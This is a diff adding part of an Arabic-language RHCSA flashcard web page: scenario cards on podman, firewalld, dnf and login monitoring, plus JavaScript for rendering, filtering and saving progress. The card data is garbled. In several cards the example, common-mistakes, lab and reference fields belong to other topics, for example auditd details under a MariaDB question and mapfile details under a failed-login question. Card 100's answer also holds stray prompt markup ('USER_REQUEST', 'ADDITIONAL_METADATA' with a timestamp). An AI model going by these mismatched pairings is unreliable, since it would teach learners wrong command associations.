+                q: `سيناريو: تريد تشغيل حاوية MariaDB تبقى شغالة بعد reboot.`,
+                a: `podman run -d --name mariadb -v /dbdata:/var/lib/mysql:Z -p 3306:3306 mariadb
+podman generate systemd --new mariadb > ~/.config/systemd/user/mariadb.service
+systemctl --user daemon-reload
+systemctl --user enable --now mariadb.service
+loginctl enable-linger`,
+                example: `ausearch -k passwd_changes -f /etc/passwd`,
+                mistakes: `كتابة قواعد مؤقتة بـ auditctl دون تسجيلها بملف <code>/etc/audit/rules.d/audit.rules</code> مما يسبب اختفاءها عند الـ reboot.`,
+                lab: `أضف قاعدة مراقبة لملف passwd، وقم بتعديل مستخدم، ثم ابحث بالـ <code>ausearch</code>.`,
+                ref: `man auditctl / man ausearch`,
+                related: ['auditd', 'aureport']
+            },
+            {
+                id: 98,
+                cat: "🏆 أسئلة سيناريو (Scenario-Based)",
+                difficulty: "Advanced",
+                tags: ['Defensive', 'Logs'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `سيناريو: تريد حظر جميع الاتصالات الواردة ما عدا SSH و HTTP.`,
+                a: `firewall-cmd --set-default-zone=drop
+firewall-cmd --permanent --add-service=ssh
+firewall-cmd --permanent --add-service=http
+firewall-cmd --reload`,
+                example: `journalctl -p err -n 20`,
+                mistakes: `استخدام grep العادي للبحث في السجلات النصية الكبيرة وهو أبطأ بكثير من فلترة journalctl الثنائية المبنية ككشاف.`,
+                lab: `أرسل رسالة خطيرة أمنية للنظام بـ <code>logger -p local0.crit "Test Critical Alert"</code> وابحث عنها بـ journalctl.`,
+                ref: `man journalctl (logging levels)`,
+                related: ['logger', 'rsyslog']
+            },
+            {
+                id: 99,
+                cat: "🏆 أسئلة سيناريو (Scenario-Based)",
+                difficulty: "Advanced",
+                tags: ['Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `سيناريو: تريد ترقية حزم النظام بأمان.`,
+                a: `dnf update --security (تحديثات الأمان فقط) أو dnf update (الكل). ثم reboot لو تحديث النواة.`,
+                example: `nft list ruleset`,
+                mistakes: `كتابة قواعد معقدة بـ iptables على RHEL 9 بالرغم من أن النظام يقوم بترجمتها داخلياً إلى قواعد nftables.`,
+                lab: `تصفح القواعد الحالية بالنظام بصيغة nftables باستخدام <code>nft list ruleset</code>.`,
+                ref: `man nft (nftables control utility)`,
+                related: ['firewall-cmd', 'iptables']
+            },
+            {
+                id: 100,
+                cat: "🏆 أسئلة سيناريو (Scenario-Based)",
+                difficulty: "Intermediate",
+                tags: ['Bash Internals'],
+                usedIn: ['RHCSA', 'OSCP'],
+                q: `سيناريو: تريد مراقبة محاولات تسجيل دخول فاشلة.`,
+                a: `journalctl -u sshd أو grep "Failed password" /var/log/secure أو lastb (من حزمة util-linux).
+💡 نصيحة: راجع الأسئلة دي يومياً 20 سؤال، وحاول تجاوب عليها بصوت عالي. السيناريوهات (91-100) هي أهم جزء في الامتحان العملي!
+</USER_REQUEST>
+<ADDITIONAL_METADATA>
+The current local time is: 2026-07-04T20:19:27+03:00.
+</ADDITIONAL_METADATA>`,
+                example: `mapfile -t MY_ARRAY < files.txt`,
+                mistakes: `استخدام حلقة while لقراءة الملف سطراً بسطر في السكريبتات، وهو أبطأ بكثير ويستهلك موارد المعالجة بلا داعٍ.`,
+                lab: `اقرأ سطور ملف نصي وخزنها في مصفوفة بـ <code>mapfile</code> ثم اطبع العنصر الأول بـ <code>echo \${MY_ARRAY[0]}</code>.`,
+                ref: `Bash Builtins (mapfile manual)`,
+                related: ['read', 'readarray']
+            }
+        ];
+
+        // State Manager
+        let currentView = 'grid'; // 'grid' or 'focus'
+        let currentFocusIndex = 0;
+        let filteredCards = [];
+        let cardStates = {}; // id -> 'mastered' or 'review' or 'unstarted'
+
+        // Load progress from localStorage
+        function loadStates() {
+            const saved = localStorage.getItem('rhcsa_flashcards_progress');
+            if (saved) {
+                try {
+                    cardStates = JSON.parse(saved);
+                } catch (e) {
+                    cardStates = {};
+                }
+            }
+            // Fill defaults
+            flashcardsData.forEach(card => {
+                if (!cardStates[card.id]) {
+                    cardStates[card.id] = 'unstarted';
+                }
+            });
+            updateStats();
+        }
+
+        // Save progress to localStorage
+        function saveStates() {
+            localStorage.setItem('rhcsa_flashcards_progress', JSON.stringify(cardStates));
+            updateStats();
+        }
+
+        // Update stats dashboard
+        function updateStats() {
+            let mastered = 0;
+            let review = 0;
+            let total = flashcardsData.length;
+
+            flashcardsData.forEach(card => {
+                if (cardStates[card.id] === 'mastered') mastered++;
+                else if (cardStates[card.id] === 'review') review++;
+            });
+
+            document.getElementById('statTotal').innerText = total;
+            document.getElementById('statMastered').innerText = mastered;
+            document.getElementById('statReview').innerText = review;
+
+            const percentage = Math.round((mastered / total) * 100);
+            document.getElementById('statProgress').style.width = percentage + '%';
+            document.getElementById('statPercent').innerText = percentage + '%';
+        }
+
+        // Reset progress
+        window.resetProgress = function() {
+            if (confirm("هل أنت متأكد من رغبتك في تصفير تقدمك الدراسي وإلغاء تصنيف كافة البطاقات؟")) {
+                cardStates = {};
+                flashcardsData.forEach(card => {
+                    cardStates[card.id] = 'unstarted';
+                });
+                saveStates();
+                applyFilters();
+            }
+        }
+
+        // Switch Views
+        window.switchView = function(view) {
+            currentView = view;
+            document.getElementById('btnGridView').classList.toggle('active', view === 'grid');
+            document.getElementById('btnFocusView').classList.toggle('active', view === 'focus');
+
+            if (view === 'grid') {
+                document.getElementById('cardsGrid').style.display = 'grid';
+                document.getElementById('focusView').style.display = 'none';
+            } else {
+                document.getElementById('cardsGrid').style.display = 'none';
+                document.getElementById('focusView').style.display = 'block';
+                currentFocusIndex = 0;
+                loadFocusCard();
+            }
+        }
+
+        // Helper to render details block
+        function renderDetails(card) {
+            return `
+                <div class="card-details-container">
+                    ${card.example ? `
+                    <details class="card-detail" onclick="event.stopPropagation()">
+                        <summary>💻 مثال تطبيقي (Practical Example)</summary>
+                        <div class="detail-body">
+                            <code>${card.example}</code>
+                        </div>
+                    </details>
+                    ` : ''}
+
+                    ${card.mistakes ? `
+                    <details class="card-detail" onclick="event.stopPropagation()">
+                        <summary>⚠️ أخطاء شائعة (Common Mistakes)</summary>
+                        <div class="detail-body">
+                            ${card.mistakes}
+                        </div>
+                    </details>
+                    ` : ''}
+
+                    ${card.lab ? `
+                    <details class="card-detail" onclick="event.stopPropagation()">
+                        <summary>🧪 خطوات اللاب والتجربة (Lab Practice)</summary>
+                        <div class="detail-body">
+                            ${card.lab}
+                        </div>
+                    </details>
+                    ` : ''}
+
+                    ${card.ref ? `
+                    <details class="card-detail" onclick="event.stopPropagation()">
+                        <summary>📖 المراجع وصفحات المساعدة (References)</summary>
+                        <div class="detail-body">
+                            <code>${card.ref}</code>
+                        </div>
+                    </details>
+                    ` : ''}
+
+                    ${card.related && card.related.length > 0 ? `
+                    <details class="card-detail" onclick="event.stopPropagation()">
+                        <summary>🔗 أوامر وأدوات مرتبطة (Related)</summary>
+                        <div class="detail-body">
+                            ${card.related.map(r => `<code>${r}</code>`).join(' ')}
+                        </div>
+                    </details>
+                    ` : ''}
+                </div>
+            `;
+        }
+
+        // Render Grid Cards
+        function renderGrid() {
+            const grid = document.getElementById('cardsGrid');
+            grid.innerHTML = '';
+
+            filteredCards.forEach(card => {
+                const stateClass = cardStates[card.id] === 'mastered' ? 'badge-mastered' : (cardStates[card.id] === 'review' ? 'badge-review' : '');
+                const stateText = cardStates[card.id] === 'mastered' ? '✅ محفوظ' : (cardStates[card.id] === 'review' ? '🔄 مراجعة' : '🆕 جديد');
+                
+                const wrapper = document.createElement('div');
+                wrapper.className = 'flashcard-wrapper';
+                wrapper.id = `card-wrapper-${card.id}`;
+                wrapper.onclick = () => toggleGridCard(card.id);
+
+                const tagsHtml = card.tags.map(t => `<span class="badge-tag">${t}</span>`).join(' ');
+                const usedInHtml = card.usedIn.map(u => `<span class="badge-usedin">${u}</span>`).join(' ');
+
+                wrapper.innerHTML = `
+                    <div class="card-inner" id="card-inner-${card.id}">
+                        <!-- Front -->
+                        <div class="card-side card-front-side">
+                            <div class="card-header">
+                                <span class="card-cat">${card.cat}</span>
+                                <div class="header-badges">
+                                    <span class="badge-difficulty diff-${card.difficulty}">${card.difficulty}</span>
+                                    ${usedInHtml}
+                                </div>
+                            </div>
+                            <div class="card-question">Q${card.id}: ${card.q}</div>
+                            <div class="card-tags">${tagsHtml}</div>
+                            <div class="card-footer-hint">👆 اضغط لمعاينة الإجابة والتفاصيل</div>
+                        </div>
+                        <!-- Back -->
+                        <div class="card-side card-back-side" onclick="event.stopPropagation()">
+                            <div class="card-header">
+                                <span class="card-cat">${card.cat}</span>
+                                <button class="btn-flip-back" onclick="toggleGridCard(${card.id})">↩️ قلب البطاقة</button>
+                            </div>
+                            
+                            <div class="card-answer-section">
+                                <span class="card-answer-label">🔑 الإجابة والأمر الأساسي:</span>
+                                <div class="card-answer">${card.a}</div>
+                            </div>
+
+                            ${renderDetails(card)}
+
+                            <div class="card-actions">
+                                <button class="card-action-btn btn-need-review" onclick="setCardState(${card.id}, 'review')">🔄 مراجعة</button>
+                                <button class="card-action-btn btn-mastered" onclick="setCardState(${card.id}, 'mastered')">✅ حفظت</button>
+                            </div>
+                        </div>
+                    </div>
+                `;
+                grid.appendChild(wrapper);
+            });
+
+            if (filteredCards.length === 0) {
+                grid.innerHTML = `<div style="grid-column: 1/-1; text-align: center; padding: 40px; color: #8b949e; font-size: 1.2rem;">🔍 لم يتم العثور على بطاقات تطابق فلاتر البحث الحالية.</div>`;
+            }
+        }
+
+        // Toggle Grid Card Flip
+        window.toggleGridCard = function(id) {
+            document.getElementById(`card-inner-${id}`).classList.toggle('flipped');
+        }
+
+        // Toggle Focus Card Flip
+        window.toggleFocusCard = function() {
+            document.getElementById('focusCardInner').classList.toggle('flipped');
+        }
+
+        // Set Card State (Mastered or Review)
+        window.setCardState = function(id, state) {
+            cardStates[id] = state;
+            saveStates();
+            applyFilters();
+        }
+
+        // Apply Filters (Search, Category, Difficulty, Tag, State)
+        function applyFilters() {
+            const catVal = document.getElementById('categoryFilter').value;
+            const diffVal = document.getElementById('difficultyFilter').value;
+            const tagVal = document.getElementById('tagFilter').value;
+            const stateVal = document.getElementById('stateFilter').value;
+            const searchVal = document.getElementById('cardSearch').value.trim().toLowerCase();
+
+            filteredCards = flashcardsData.filter(card => {
+                // Category match
+                const catMatch = (catVal === 'all' || card.cat === catVal);
+                
+                // Difficulty match
+                const diffMatch = (diffVal === 'all' || card.difficulty === diffVal);
+                
+                // Tag match
+                const tagMatch = (tagVal === 'all' || card.tags.includes(tagVal));
+
+                // State match
+                const stateMatch = (stateVal === 'all' || 
+                                    (stateVal === 'unstarted' && cardStates[card.id] === 'unstarted') ||
+                                    (stateVal === 'review' && cardStates[card.id] === 'review') ||
+                                    (stateVal === 'mastered' && cardStates[card.id] === 'mastered'));
+
+                // Search match
+                const searchMatch = (!searchVal || 
+                                     card.q.toLowerCase().includes(searchVal) || 
+                                     card.a.toLowerCase().includes(searchVal) || 
+                                     card.cat.toLowerCase().includes(searchVal) ||
+                                     card.tags.some(t => t.toLowerCase().includes(searchVal)));
+
+                return catMatch && diffMatch && tagMatch && stateMatch && searchMatch;
+            });
+
+            if (currentView === 'grid') {
+                renderGrid();
+            } else {
+                currentFocusIndex = 0;
+                loadFocusCard();
+            }
+        }
+
+        // Focus View Navigation & Rendering
+        function loadFocusCard() {
+            const inner = document.getElementById('focusCardInner');
+            inner.classList.remove('flipped');
+
+            setTimeout(() => {
+                if (filteredCards.length === 0) {
+                    document.getElementById('focusCardQ').innerText = "لم يتم العثور على بطاقات.";
+                    document.getElementById('focusCardA').innerText = "";
+                    document.getElementById('focusCardCat').innerText = "";
+                    document.getElementById('focusCardCatBack').innerText = "";
+                    document.getElementById('focusProgressText').innerText = "0 / 0";
+                    document.getElementById('focusCardBadgesFront').innerHTML = "";
+                    document.getElementById('focusCardTagsFront').innerHTML = "";
+                    document.getElementById('focusCardDetails').innerHTML = "";
+                    document.getElementById('focusCardActions').innerHTML = "";
+                    return;
+                }
+
+                const card = filteredCards[currentFocusIndex];
+                document.getElementById('focusCardCat').innerText = card.cat;
+                document.getElementById('focusCardCatBack').innerText = card.cat;
+                document.getElementById('focusCardQ').innerText = `Q${card.id}: ${card.q}`;
+                document.getElementById('focusCardA').innerHTML = card.a;
+                document.getElementById('focusProgressText').innerText = `${currentFocusIndex + 1} / ${filteredCards.length}`;
+                
+                // Badges and tags
+                const usedInHtml = card.usedIn.map(u => `<span class="badge-usedin">${u}</span>`).join(' ');
+                document.getElementById('focusCardBadgesFront').innerHTML = `
+                    <span class="badge-difficulty diff-${card.difficulty}">${card.difficulty}</span>
+                    ${usedInHtml}
+                `;
+                document.getElementById('focusCardTagsFront').innerHTML = card.tags.map(t => `<span class="badge-tag">${t}</span>`).join(' ');
+
+                // Details
+                document.getElementById('focusCardDetails').innerHTML = renderDetails(card);
+
+                // Set actions
+                document.getElementById('focusCardActions').innerHTML = `
+                    <button class="card-action-btn btn-need-review" onclick="setCardState(${card.id}, 'review'); nextFocusAfterSelect();">🔄 مراجعة</button>
+                    <button class="card-action-btn btn-mastered" onclick="setCardState(${card.id}, 'mastered'); nextFocusAfterSelect();">✅ حفظت</button>
+                `;
+
+                // Update navigation buttons status
+                document.getElementById('btnFocusPrev').disabled = (currentFocusIndex === 0);
+                document.getElementById('btnFocusPrev').style.opacity = (currentFocusIndex === 0) ? 0.5 : 1;
+                document.getElementById('btnFocusNext').disabled = (currentFocusIndex === filteredCards.length - 1);
+                document.getElementById('btnFocusNext').style.opacity = (currentFocusIndex === filteredCards.length - 1) ? 0.5 : 1;
+            }, 150);
+        }
+
+        window.navigateFocus = function(dir) {
+            const nextIdx = currentFocusIndex + dir;
+            if (nextIdx >= 0 && nextIdx < filteredCards.length) {
+                currentFocusIndex = nextIdx;
+                loadFocusCard();
+            }
+        }
+
+        window.nextFocusAfterSelect = function() {
+            if (currentFocusIndex < filteredCards.length - 1) {
+                setTimeout(() => {
+                    navigateFocus(1);
+                }, 300);
+            }
+        }
+
+        // Init
+        document.addEventListener('DOMContentLoaded', () => {
+            loadStates();
+            applyFilters();
+
+            // Event Listeners
+            document.getElementById('categoryFilter').addEventListener('change', applyFilters);
+            document.getElementById('difficultyFilter').addEventListener('change', applyFilters);
+            document.getElementById('tagFilter').addEventListener('change', applyFilters);
+            document.getElementById('stateFilter').addEventListener('change', applyFilters);
+            document.getElementById('cardSearch').addEventListener('input', applyFilters);
+        });
+    </script>
+    <script src="features.js?v=20"></script>
+</body>
+</html>
